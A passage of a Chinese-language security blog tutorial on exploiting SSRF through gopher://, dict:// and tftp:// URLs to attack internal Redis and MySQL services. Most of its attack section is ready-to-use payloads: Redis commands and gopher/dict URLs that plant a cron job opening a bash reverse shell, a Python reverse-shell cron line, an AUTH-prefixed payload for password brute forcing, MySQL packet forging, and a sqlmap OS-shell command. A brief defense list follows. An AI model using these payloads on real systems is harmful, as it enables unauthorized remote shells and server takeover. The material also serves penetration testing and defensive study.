+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15622333654611.jpg" alt></p>
+<h3 id="Tftp"><a href="#Tftp" class="headerlink" title="Tftp://"></a>Tftp://</h3><p>主要用来发送 UDP 包，与 gopher 类似，可以用来向UDP服务发起请求，比如 Memcache 和 REDIS-UDP</p>
+<p><strong>通过设置<code>timeout=1</code>可快速断开连接并防止重发</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15625561157901.jpg" alt="-w1084"></p>
+<h3 id="其他协议"><a href="#其他协议" class="headerlink" title="其他协议"></a>其他协议</h3><ul>
+<li>sftp://：CVE-2015-1782：在<code>libssh2 1.4.3</code>及之前版本的<code>kex_agree_methods</code>函数存在安全漏洞</li>
+<li>ldap://、ldaps://、ldapi://：ldapi 在高级版本 curl 不予支持，其余两者暂未知如何利用<br>  <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15625568728723.jpg" alt="-w1012"></li>
+<li>imap/imaps/pop3/pop3s/smtp/smtps：破邮件用户名密码</li>
+</ul>
+<h2 id="0x05-攻击应用"><a href="#0x05-攻击应用" class="headerlink" title="0x05 攻击应用"></a>0x05 攻击应用</h2><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>※ <a href="https://redis.io/topics/protocol" target="_blank" rel="noopener">Redis Protocol specification</a></p>
+<p>常见的 Redis 未授权访问有三种方式</p>
+<ul>
+<li>crontab：计划任务反弹 shell</li>
+<li>ssh：写公钥登录</li>
+<li>webshell：需要绝对路径</li>
+</ul>
+<h4 id="auth-认证"><a href="#auth-认证" class="headerlink" title="auth 认证"></a>auth 认证</h4><p>如果开启密码认证，如下设置密码<code>123456</code></p>
+<pre class=" language-plain"><code class="language-plain"># /etc/redis/redis.conf
+requirepass 123456</code></pre>
+<p>对应在<code>redis-cli</code>中需要添加<code>-a</code>参数进行 auth 认证</p>
+<pre class=" language-shell"><code class="language-shell">> redis-cli -h &#x3c;host> -p &#x3c;port> -a &#x3c;password> &#x3c;command></code></pre>
+<p>socat 观察可以看到会先进行 auth 认证再执行命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15626370600268.jpg" alt="-w372"></p>
+<p>在官方文档中提到Redis是<code>Request-Response model</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15626376472192.jpg" alt="-w893"></p>
+<p>大致意思是说<strong>Redis客户端支持管道操作，可以通过单个写入操作发送多个命令，而无需在发出下一个命令之前读取上一个命令的服务器回复，并在最后统一回复</strong></p>
+<p><strong>所以在攻击 payload 前添加一段认证语句即可</strong></p>
+<pre><code>gopher://127.0.0.1:6379/^*2%0d%0a%244%0d%0aAUTH%0d%0a%246%0d%0a123456%0d%0a&lt;gopher payload&gt;</code></pre><p>例如执行<code>get cc</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15626380550704.jpg" alt="-w1004"></p>
+<hr>
+<p>可以利用这点进弱口令爆破</p>
+<ul>
+<li>有回显：错误密码回显<code>ERR invalid password</code></li>
+<li>无回显：需要配合生成文件、计划命令执行等操作进行验证</li>
+</ul>
+<h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><pre class=" language-shell"><code class="language-shell"># $1 -> &#x3c;ip>
+# $2 -> &#x3c;port>
+> redis-cli -h $1 -p $2 flushall
+> echo -e "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1'\n\n"|redis-cli -h $1 -p $2 -x set 1
+> redis-cli -h $1 -p $2 config set dir /var/spool/cron/crontabs/
+> redis-cli -h $1 -p $2 config set dbfilename root
+> redis-cli -h $1 -p $2 save
+> redis-cli -h $1 -p $2 quit</code></pre>
+<p>之所以将计划任务通过管道符 <code>|</code> 配合 <code>-x</code> 填入，是因为 <strong>redis-cli set 的话<code>\n</code>会被转义成<code>\\n</code>导致在计划任务中无法执行</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>cron</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#x7c;</code> with <code>-x</code></td>
+<td><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15623168103165.jpg" alt="-w558"></td>
+</tr>
+<tr>
+<td><code>set</code></td>
+<td><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15623168563806.jpg" alt="-w563"></td>
+</tr>
+</tbody></table>
+<h4 id="Attack-with-Gopher"><a href="#Attack-with-Gopher" class="headerlink" title="Attack with Gopher://"></a>Attack with Gopher://</h4><p>首先利用 socat 获取 tcp 流量</p>
+<pre class=" language-shell"><code class="language-shell">> socat -v tcp-listen:6373,fork tcp-connect:localhost:6379</code></pre>
+<p>流比较长，将请求部分按照 gopher 那节进行转换</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15622477827857.jpg" alt="-w478"></p>
+<p>转换出的 gopher Url，记得末尾加个<code>quit</code></p>
+<pre class=" language-url"><code class="language-url">gopher://127.0.0.1:6379/^*1%0d%0a%248%0d%0aflushall%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0ac%0d%0a%2472%0d%0a%0a%0a*/1 * * * * /bin/bash/ -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1'%0a%0a%0a%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2425%0d%0a/var/spool/cron/crontabs/%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%244%0d%0aroot%0d%0a*1%0d%0a%244%0d%0asave%0d%0aquit</code></pre>
+<p>执行攻击结果</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15622480525231.jpg" alt="-w836"></p>
+<h4 id="Attack-with-Dict"><a href="#Attack-with-Dict" class="headerlink" title="Attack with Dict://"></a>Attack with Dict://</h4><p>这个就简单的多，一条一条请求，脚本化比较好，避免中间有其他人插入数据</p>
+<p>可以注意到，dict 会同时发送客户端版本，不过不构成命令所以无影响</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15623061752615.jpg" alt="-w604"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15622973413416.jpg" alt="-w600"></p>
+<p><strong>注意：经测试，在 dict 中 <code>&#39;</code> 内不能跟 bash 而只能写 sh，否则会乱码，暂时未找到解决方法</strong></p>
+<p>注意：因为这里<code>set c &lt;value&gt;</code>是直接 tcp 流过去的，与<code>redis-cli</code>中不同，所以可以直接执行 set 命令，有兴趣可以自己跟下流量</p>
+<pre class=" language-url"><code class="language-url">dict://127.0.0.1:6379/flushall
+dict://127.0.0.1:6379/set:c:"\n\n*/1 * * * * /bin/bash -c 'sh -i >& /dev/tcp/127.0.0.1/9999 0>&1'\n\n"
+dict://127.0.0.1:6379/config:set:dir:/var/spool/cron/crontabs/
+dict://127.0.0.1:6379/config:set:dbfilename:root
+dict://127.0.0.1:6379/save</code></pre>
+<p>使用 curl 携带 payload 如下</p>
+<pre class=" language-shell"><code class="language-shell">> curl -v "dict://127.0.0.1:6379/set:c:\"\n\n*/1 * * * * /bin/bash -c 'sh -i >& /dev/tcp/127.0.0.1/9999 0>&1'\n\n\""</code></pre>
+<p>同理 payload 作为参数时，还需要 urlencode 一次</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15623242446251.jpg" alt="-w835"></p>
+<h5 id="crontab-注意事项"><a href="#crontab-注意事项" class="headerlink" title="crontab 注意事项"></a>crontab 注意事项</h5><p>Centos定时任务在 <code>/var/spool/cron/root</code><br>Ubuntu定时任务在 <code>/var/spool/cron/crontabs/root</code></p>
+<p>Debian的系统日志里面没有crontab这一项，可以手动开启，方便检查</p>
+<pre class=" language-shell"><code class="language-shell">> vim /etc/rsyslog.conf
+    cron.*                          /var/log/cron.log   # 取消注释
+> /etc/init.d/rsyslog restart</code></pre>
+<p>另外，redis 会将文件权限改为<code>644</code>，debian 下不能执行，ubuntu 也不行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15622482376488.jpg" alt="-w485"></p>
+<p>错误日志如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15622482948487.jpg" alt="-w562"></p>
+<hr>
+<p><strong>以下实在不想测试了，直接摘文章</strong></p>
+<p>写入/etc/crontab的时候，由于存在乱码，所以会导致ubuntu不能正确识别，导致定时任务失败。</p>
+<ul>
+<li>如果写<code>/etc/crontab</code>，由于存在乱码，语法不识别，会导致ubuntu不能正确识别，导致定时任务失败。</li>
+<li>如果写<code>/var/spool/cron/crontabs/root</code>，权限是644，ubuntu不能运行。</li>
+</ul>
+<p><strong>所以ubuntu下使用redis写crontab是无法成功反弹shell的</strong></p>
+<p>如果只能写文件，想写crontab反弹shell，对于CentOS系来说:</p>
+<ul>
+<li>写/etc/crontab文件</li>
+<li>使用python反弹shell脚本</li>
+</ul>
+<pre class=" language-shell"><code class="language-shell">*/1 * * * * python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
+<h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3><p>直接上文章，懒得搭环境了</p>
+<p><a href="https://www.angelwhu.com/blog/?p=427" target="_blank" rel="noopener">https://www.angelwhu.com/blog/?p=427</a></p>
+<h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><h4 id="MySQL-通信协议"><a href="#MySQL-通信协议" class="headerlink" title="MySQL 通信协议"></a>MySQL 通信协议</h4><p>MySQL分为服务端和客户端，客户端连接服务器使存在三种方法：</p>
+<ul>
+<li>Unix套接字；</li>
+<li>内存共享/命名管道；</li>
+<li>TCP/IP套接字；</li>
+</ul>
+<p>在Linux或者Unix环境下，当我们输入<code>mysql –u root –p root</code>（注意没有<code>-h</code>）登录MySQL服务器时就是用的Unix套接字连接；Unix套接字其实不是一个网络协议，只能在客户端和Mysql服务器在同一台电脑上才可以使用</p>
+<p>在window系统中客户端和Mysql服务器在同一台电脑上，可以使用命名管道和共享内存的方式</p>
+<p>TCP/IP套接字是在任何系统下都可以使用的方式，也是使用最多的连接方式，当我们输入<code>mysql –h 127.0.0.1 –u root –p root</code>时就是使用的TCP/IP套接字</p>
+<h4 id="MySQL-认证过程"><a href="#MySQL-认证过程" class="headerlink" title="MySQL 认证过程"></a>MySQL 认证过程</h4><p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。</p>
+<p>MySQL客户端与服务器的交互主要分为两个阶段：Connection Phase（连接阶段或者叫认证阶段）和Command Phase（命令阶段）。在连接阶段包括握手包和认证包，这里我们不详细说明握手包，主要关注认证数据包</p>
+<p>数据包格式暂时不用太过了解，直接使用程序伪造即可</p>
+<h4 id="构造数据包"><a href="#构造数据包" class="headerlink" title="构造数据包"></a>构造数据包</h4><p>可以本地使用套接字登录，wireshark、tcpdump 获取 Mysql 数据包</p>
+<p>最好是完整的数据包，包括<code>连接</code>、<code>认证</code>、<code>命令执行</code>、<code>退出</code>四个步骤，其中<code>退出</code>数据包可以直接使用<code>\r\n</code>代替</p>
+<p>简单测试，创建一个 nopass 用户并授予全部权限</p>
+<pre class=" language-shell"><code class="language-shell">> CREATE USER 'nopass'@'localhost';
+> GRANT USAGE ON *.* TO 'nopass'@'localhost';
+> GRANT ALL ON *.* TO 'nopass'@'localhost';</code></pre>
+<p>然后登录并查询一下用户，将 tcp 流获取下来（这里没有执行退出，所以最后要加<code>\r\n</code>）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15628143479571.jpg" alt="-w613"></p>
+<p>利用 Python 转换成 urlencode</p>
+<pre class=" language-python"><code class="language-python">tc <span class="token operator">=</span> <span class="token string">"&lt;tcp_stream_hex>"</span>
+a <span class="token operator">=</span> <span class="token punctuation">[</span>tc<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>tc<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> <span class="token string">'%'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>
+<p>最后利用 gopher:// 打一下，OK</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15628145301945.jpg" alt="-w1664"></p>
+<h4 id="Udf-反弹-shell"><a href="#Udf-反弹-shell" class="headerlink" title="Udf 反弹 shell"></a>Udf 反弹 shell</h4><p>环境有点麻烦，暂时直接上文章</p>
+<p>简单的话，本地利用 sqlmap 抓一下tcp流量直接打过去</p>
+<pre class=" language-shell"><code class="language-shell">> sqlmap -d "mysql://root:toor@192.168.99.213:3306/test" --os-shell</code></pre>
+<p>需要注意：</p>
+<ol>
+<li><code>plugin_dir</code>：路径需要和目标匹配</li>
+<li>so 兼容性：sqlmap 自带的有时会出现一些问题</li>
+</ol>
+<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>只要是基于<code>Tcp Stream</code>且无交互的点，都可以直接进行攻击</p>
+<p><em><code>Udp</code>可基于<code>tftp://</code>但尚未测试</em></p>
+<h2 id="0x06-防御"><a href="#0x06-防御" class="headerlink" title="0x06 防御"></a>0x06 防御</h2><ol>
+<li><p>限制协议为HTTP、HTTPS</p>
+<pre class=" language-config"><code class="language-config"> curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</code></pre>
+</li>
+<li><p>禁止30x跳转</p>
+<pre class=" language-config"><code class="language-config"> 删掉或注释 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</code></pre>
+</li>
+<li><p>设置白名单或限制内网ip</p>
+</li>
+<li><p>设置 DNS 缓存，在访问前进行对比 </p>
+</li>
+</ol>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a href="https://coomrade.github.io/2018/10/28/SSRF%E6%94%BB%E5%87%BBMySQL/" target="_blank" rel="noopener">https://coomrade.github.io/2018/10/28/SSRF%E6%94%BB%E5%87%BBMySQL/</a></li>
+<li><a href="https://hackmd.io/@Lhaihai/H1B8PJ9hX?type=view#34c3ctf-extract0r" target="_blank" rel="noopener">https://hackmd.io/@Lhaihai/H1B8PJ9hX?type=view#34c3ctf-extract0r</a></li>
+</ul>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://blog.sari3l.com">Sariel.D</a>
+            <p>原文链接：<a href="https://blog.sari3l.com/posts/85fdfb64/">https://blog.sari3l.com/posts/85fdfb64/</a>
+            <p>发表日期：<a href="https://blog.sari3l.com/posts/85fdfb64/">July 16th 2019, 8:20:35 pm</a>
+            <p>更新日期：<a href="https://blog.sari3l.com/posts/85fdfb64/">July 6th 2020, 5:45:09 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/posts/76496c2b/" title= "Fastjson 新反序列化漏洞解析">
+                    <div class="nextTitle">Fastjson 新反序列化漏洞解析</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/posts/d8415c32/" title= "Discuz! ML 3.x 命令执行简析">
+                    <div class="prevTitle">Discuz! ML 3.x 命令执行简析</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:master@mail.sari3l.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/sari3l" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.instagram.com/x3rias" class="iconfont-archer instagram" target="_blank" title=instagram></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-number">1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-验证方法"><span class="toc-number">2.</span> <span class="toc-text">0x00 验证方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-常见攻击方式"><span class="toc-number">3.</span> <span class="toc-text">0x01 常见攻击方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-常用工具"><span class="toc-number">4.</span> <span class="toc-text">0x02 常用工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#盲打"><span class="toc-number">4.1.</span> <span class="toc-text">盲打</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-常见绕过姿势"><span class="toc-number">5.</span> <span class="toc-text">0x03 常见绕过姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i-IP-格式"><span class="toc-number">5.1.</span> <span class="toc-text">i. IP 格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ii-不一致性"><span class="toc-number">5.2.</span> <span class="toc-text">ii. 不一致性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iii-特殊字符"><span class="toc-number">5.3.</span> <span class="toc-text">iii. 特殊字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iv-302-Redirect"><span class="toc-number">5.4.</span> <span class="toc-text">iv. 302 Redirect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#v-DNS-Rebinding"><span class="toc-number">5.5.</span> <span class="toc-text">v. DNS Rebinding</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-常用协议"><span class="toc-number">6.</span> <span class="toc-text">0x04 常用协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gopher"><span class="toc-number">6.1.</span> <span class="toc-text">Gopher:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Url-Syntax"><span class="toc-number">6.1.1.</span> <span class="toc-text">Url Syntax</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tcp-Stream"><span class="toc-number">6.1.2.</span> <span class="toc-text">Tcp Stream</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-Method"><span class="toc-number">6.1.3.</span> <span class="toc-text">HTTP Method</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dict"><span class="toc-number">6.2.</span> <span class="toc-text">Dict:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Url-Syntax-1"><span class="toc-number">6.2.1.</span> <span class="toc-text">Url Syntax</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File"><span class="toc-number">6.3.</span> <span class="toc-text">File:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-s"><span class="toc-number">6.4.</span> <span class="toc-text">HTTP(s):&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tftp"><span class="toc-number">6.5.</span> <span class="toc-text">Tftp:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他协议"><span class="toc-number">6.6.</span> <span class="toc-text">其他协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-攻击应用"><span class="toc-number">7.</span> <span class="toc-text">0x05 攻击应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis"><span class="toc-number">7.1.</span> <span class="toc-text">Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#auth-认证"><span class="toc-number">7.1.1.</span> <span class="toc-text">auth 认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#crontab"><span class="toc-number">7.1.2.</span> <span class="toc-text">crontab</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Attack-with-Gopher"><span class="toc-number">7.1.3.</span> <span class="toc-text">Attack with Gopher:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Attack-with-Dict"><span class="toc-number">7.1.4.</span> <span class="toc-text">Attack with Dict:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#crontab-注意事项"><span class="toc-number">7.1.4.1.</span> <span class="toc-text">crontab 注意事项</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastCGI"><span class="toc-number">7.2.</span> <span class="toc-text">FastCGI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql"><span class="toc-number">7.3.</span> <span class="toc-text">Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL-通信协议"><span class="toc-number">7.3.1.</span> <span class="toc-text">MySQL 通信协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL-认证过程"><span class="toc-number">7.3.2.</span> <span class="toc-text">MySQL 认证过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#构造数据包"><span class="toc-number">7.3.3.</span> <span class="toc-text">构造数据包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Udf-反弹-shell"><span class="toc-number">7.3.4.</span> <span class="toc-text">Udf 反弹 shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其它"><span class="toc-number">7.4.</span> <span class="toc-text">其它</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-防御"><span class="toc-number">8.</span> <span class="toc-text">0x06 防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文章"><span class="toc-number">9.</span> <span class="toc-text">参考文章</span></a></li></ol> -->
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-验证方法"><span class="toc-text">0x00 验证方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-常见攻击方式"><span class="toc-text">0x01 常见攻击方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-常用工具"><span class="toc-text">0x02 常用工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#盲打"><span class="toc-text">盲打</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-常见绕过姿势"><span class="toc-text">0x03 常见绕过姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i-IP-格式"><span class="toc-text">i. IP 格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ii-不一致性"><span class="toc-text">ii. 不一致性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iii-特殊字符"><span class="toc-text">iii. 特殊字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iv-302-Redirect"><span class="toc-text">iv. 302 Redirect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#v-DNS-Rebinding"><span class="toc-text">v. DNS Rebinding</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-常用协议"><span class="toc-text">0x04 常用协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gopher"><span class="toc-text">Gopher:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Url-Syntax"><span class="toc-text">Url Syntax</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tcp-Stream"><span class="toc-text">Tcp Stream</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-Method"><span class="toc-text">HTTP Method</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dict"><span class="toc-text">Dict:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Url-Syntax-1"><span class="toc-text">Url Syntax</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File"><span class="toc-text">File:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-s"><span class="toc-text">HTTP(s):&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tftp"><span class="toc-text">Tftp:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他协议"><span class="toc-text">其他协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-攻击应用"><span class="toc-text">0x05 攻击应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis"><span class="toc-text">Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#auth-认证"><span class="toc-text">auth 认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#crontab"><span class="toc-text">crontab</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Attack-with-Gopher"><span class="toc-text">Attack with Gopher:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Attack-with-Dict"><span class="toc-text">Attack with Dict:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#crontab-注意事项"><span class="toc-text">crontab 注意事项</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastCGI"><span class="toc-text">FastCGI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql"><span class="toc-text">Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL-通信协议"><span class="toc-text">MySQL 通信协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL-认证过程"><span class="toc-text">MySQL 认证过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#构造数据包"><span class="toc-text">构造数据包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Udf-反弹-shell"><span class="toc-text">Udf 反弹 shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其它"><span class="toc-text">其它</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-防御"><span class="toc-text">0x06 防御</span></a></li><li class="toc-item 